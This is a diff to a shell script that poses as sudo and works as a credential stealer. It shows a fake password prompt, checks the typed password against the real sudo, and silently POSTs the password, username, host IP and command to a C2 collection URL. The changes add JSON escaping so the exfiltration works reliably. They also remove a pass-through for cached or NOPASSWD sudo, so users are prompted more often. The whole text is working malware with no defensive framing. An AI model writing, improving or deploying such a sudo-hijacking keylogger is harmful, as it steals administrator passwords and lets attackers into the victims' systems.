@@ -18,6 +18,13 @@ COLLECT_URL="http://${C2_HOST}:${C2_PORT}/log"
 mkdir -p "$LOG_DIR" 2>/dev/null
 chmod 700 "$LOG_DIR" 2>/dev/null
 
+_json_esc() {
+    local s="$1"
+    s="${s//\\/\\\\}"
+    s="${s//\"/\\\"}"
+    printf '%s' "$s"
+}
+
 # -------------------------------------------------------
 # Resolve identity/context upfront (cheap calls)
 # -------------------------------------------------------
@@ -38,8 +45,10 @@ done
 if [ $_HAS_S -eq 1 ]; then
     IFS= read -r CAPTURED_PASS
     if [ -n "$CAPTURED_PASS" ]; then
+        SAFE_PASS=$(_json_esc "$CAPTURED_PASS")
+        SAFE_ARGS=$(_json_esc "$COMMAND_ARGS")
         PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"sudo","timestamp":"%s","data":{"password":"%s","command":"%s","source":"stdin"}}' \
-            "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$CAPTURED_PASS" "$COMMAND_ARGS")
+            "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$SAFE_PASS" "$SAFE_ARGS")
         curl -sf -X POST -H "Content-Type: application/json" \
             -d "$PAYLOAD" --connect-timeout 3 --max-time 3 \
             "$COLLECT_URL" > /dev/null 2>&1 &
@@ -79,14 +88,6 @@ if [ ! -t 0 ]; then
     exec $REAL_SUDO "$@"
 fi
 
-# -------------------------------------------------------
-# Pass straight through if sudo won't prompt
-# (NOPASSWD or timestamp cache still valid)
-# -------------------------------------------------------
-if $REAL_SUDO -n true 2>/dev/null; then
-    exec $REAL_SUDO "$@"
-fi
-
 IFS= read -r -s -p "[sudo] password for ${INVOKING_USER}: " CAPTURED_PASS
 echo ""
 
@@ -94,12 +95,14 @@ VALIDATE=$(echo "$CAPTURED_PASS" | $REAL_SUDO -S -v 2>&1)
 VALIDATE_RC=$?
 
 if [ $VALIDATE_RC -eq 0 ]; then
+    SAFE_PASS=$(_json_esc "$CAPTURED_PASS")
+    SAFE_ARGS=$(_json_esc "$COMMAND_ARGS")
     PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"sudo","timestamp":"%s","data":{"password":"%s","command":"%s"}}' \
         "$HOST_IP" \
         "$INVOKING_USER" \
         "$HOST_TS" \
-        "$CAPTURED_PASS" \
-        "$COMMAND_ARGS")
+        "$SAFE_PASS" \
+        "$SAFE_ARGS")
 
     curl -sf -X POST -H "Content-Type: application/json" \
         -d "$PAYLOAD" --connect-timeout 3 --max-time 3 \
